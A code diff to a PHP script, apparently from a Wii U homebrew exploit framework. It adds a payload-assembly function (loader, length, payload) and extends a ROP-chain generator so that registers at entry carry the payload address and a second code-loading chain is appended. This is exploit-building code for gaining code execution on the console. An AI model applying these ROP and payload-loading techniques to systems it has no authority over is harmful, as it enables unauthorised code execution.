@@ -98,6 +98,22 @@ function generate_ropchain()
 	if($generatebinrop==0)$ROPCHAIN.= "\"";
 }
 
+function wiiuhaxx_generatepayload()
+{
+	$actual_payload = file_get_contents("wiiuhaxx_payload.bin");
+	if($actual_payload === FALSE || strlen($actual_payload) < 4)return FALSE;
+
+	$loader = file_get_contents("wiiuhaxx_loader.bin");
+	if($loader === FALSE || strlen($loader) < 4)return FALSE;
+	$len = strlen($actual_payload);
+
+	if($len & 0x3)return FALSE;//The actual payload size must be 4-byte aligned.
+
+	$loader .= pack("N*", $len);
+
+	return $loader . $actual_payload;
+}
+
 function ropgen_pop_r24_to_r31($inputregs)
 {
 	global $ROP_POP_R24_TO_R31;
@@ -364,7 +380,7 @@ function ropgen_switchto_core1()
 
 function generateropchain_type1()
 {
-	global $ROP_OSFatal, $ROP_Exit, $ROP_OSDynLoad_Acquire, $ROP_OSDynLoad_FindExport, $ROP_os_snprintf, $payload_srcaddr, $ROPHEAP;
+	global $ROP_OSFatal, $ROP_Exit, $ROP_OSDynLoad_Acquire, $ROP_OSDynLoad_FindExport, $ROP_os_snprintf, $payload_srcaddr, $ROPHEAP, $ROPCHAIN;
 
 	$payload_size = 0x20000;//Doesn't really matter if the actual payload data size in memory is smaller than this or not.
 	$codegen_addr = 0x01800000;
@@ -388,13 +404,19 @@ function generateropchain_type1()
 	$regs[26 - 24] = $ROP_OSDynLoad_Acquire;//r26
 	$regs[27 - 24] = $ROP_OSDynLoad_FindExport;//r27
 	$regs[28 - 24] = $ROP_os_snprintf;//r28
-	$regs[29 - 24] = 0x0;//r29
-	$regs[30 - 24] = 0x0;//r30
+	$regs[29 - 24] = $payload_srcaddr;//r29
+	$regs[30 - 24] = 0x8;//r30 The payload can do this at entry to determine the start address of the code-loading ROP-chain: r1+= r30. r1+4 after that is where the jump-addr should be loaded from. The above r29 is a ptr to the input data used for payload loading.
 	$regs[31 - 24] = $ROPHEAP;//r31
 
 	ropgen_pop_r24_to_r31($regs);//Setup r24..r31 at the time of payload entry. Basically a "paramblk" in the form of registers, since this is the only available way to do this with the ROP-gadgets currently used by this codebase.
 
 	ropchain_appendu32($codegen_addr);//Jump to the codegen area where the payload was written.
+
+	//Setup the code-loading ROP-chain which can be used by the loader-payload, since the above one isn't usable after execution due to being corrupted.
+	ropchain_appendu32(0x0);
+	ropgen_copycodebin_to_codegen($codegen_addr, $payload_srcaddr, $payload_size);
+	ropgen_pop_r24_to_r31($regs);
+	ropchain_appendu32($codegen_addr);
 }
 
 ?>
